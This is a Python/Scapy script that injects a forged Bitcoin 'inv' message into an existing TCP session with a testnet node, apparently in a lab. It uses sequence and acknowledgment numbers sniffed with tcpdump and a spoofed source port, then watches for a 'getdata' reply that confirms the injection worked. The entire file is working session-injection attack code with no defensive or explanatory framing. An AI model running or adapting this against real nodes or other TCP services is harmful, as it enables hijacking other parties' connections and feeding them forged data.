from scapy.all import *
import struct
import hashlib

# --- Manual Configuration from your tcpdump ---
TARGET_IP = "172.20.9.230"
TARGET_PORT = 18333
SRC_PORT = 54321 # Ensure this matches the port Node B was talking to

# THE NUMBERS YOU EXTRACTED:
EXPECTED_SEQ = 1572216673
EXPECTED_ACK = 2834160184

MAGIC = b'\x0b\x11\x09\x07'

def get_checksum(p):
    return hashlib.sha256(hashlib.sha256(p).digest()).digest()[:4]

def btc_msg(cmd, payload):
    return MAGIC + cmd.encode().ljust(12, b'\x00') + struct.pack('<I', len(payload)) + get_checksum(payload) + payload

# 1. Construct the Bitcoin 'inv' Message
# Type 1 = MSG_TX, 32-byte dummy hash
dummy_txid = b'\x42' * 32 
inv_payload = b'\x01' + struct.pack('<I', 1) + dummy_txid
inv_msg = btc_msg("inv", inv_payload)

# 2. Build and Send the TCP Packet
print(f"[*] Injecting 'inv' using SEQ: {EXPECTED_SEQ} and ACK: {EXPECTED_ACK}")

ip = IP(dst=TARGET_IP)
tcp = TCP(sport=SRC_PORT, dport=TARGET_PORT, flags='PA', 
          seq=EXPECTED_SEQ, ack=EXPECTED_ACK)

send(ip/tcp/inv_msg)

# 3. Wait for the 'getdata' response
print("[*] Monitoring for 'getdata' (Wait 5s)...")
def monitor(pkt):
    if pkt.haslayer(Raw) and b'getdata' in pkt[Raw].load:
        print(f"[!] SUCCESS: Node B accepted our packet and requested the TX!")
        print(f"    New Sequence from Node B: {pkt[TCP].seq}")
        return True
    return False

sniff(filter=f"tcp port {TARGET_PORT} and host {TARGET_IP}", stop_filter=monitor, timeout=5)